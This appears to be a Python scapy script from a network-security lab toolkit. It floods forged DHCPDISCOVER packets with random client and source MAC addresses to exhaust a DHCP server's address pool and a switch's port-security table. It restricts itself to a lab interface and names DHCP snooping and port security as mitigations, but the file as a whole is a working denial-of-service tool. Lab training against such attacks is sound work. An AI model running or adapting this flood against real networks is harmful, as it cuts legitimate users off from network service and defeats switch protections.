#!/usr/bin/env python3
"""DHCP: starvation — flood DHCPDISCOVER with random client MACs (chaddr) to
exhaust the real server's address pool. Mitigation: DHCP snooping rate-limit
+ port-security (see README)."""
import os
import random
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import base_parser, enforce_lab_iface, require_scapy, status, run_loop, selftest_ok, forged_mac  # noqa: E402


def rand_chaddr():
    return bytes([0x02, 0x00, 0x00] + [random.randint(0, 255) for _ in range(3)])


def build_discover(scapy_all, xid, chaddr):
    Ether, IP, UDP, BOOTP, DHCP = (scapy_all.Ether, scapy_all.IP, scapy_all.UDP,
                                    scapy_all.BOOTP, scapy_all.DHCP)
    # A fresh forged (non-zero) L2 source per frame: required or the PNetLab link
    # bridge drops the broadcast before the server sees it (see
    # common.forged_mac()), AND a distinct source MAC per DISCOVER is what
    # exhausts the switch's port-security table, not just the DHCP pool — the
    # BOOTP chaddr alone (below) does not, since port-security keys on L2 src.
    return (Ether(src=forged_mac(), dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=chaddr, xid=xid, flags=0x8000) /
            DHCP(options=[("message-type", "discover"), "end"]))


def main():
    p = base_parser("DHCP starvation: flood DISCOVER with random client MACs")
    args = p.parse_args()
    enforce_lab_iface(args.iface)
    require_scapy()
    import scapy.all as scapy_all

    pkt = build_discover(scapy_all, 1234, rand_chaddr())
    if args.selftest:
        selftest_ok("dhcp_starve", "DHCPDISCOVER len=%d" % len(bytes(pkt)))
        return

    def send(n):
        for _ in range(20):
            xid = random.randint(1, 0xFFFFFFFF)
            scapy_all.sendp(build_discover(scapy_all, xid, rand_chaddr()), iface=args.iface, verbose=0)
        status("SENT", "batch #%d: 20 DISCOVER with random chaddr" % (n + 1))

    run_loop(args.count, args.interval, send)


if __name__ == "__main__":
    main()

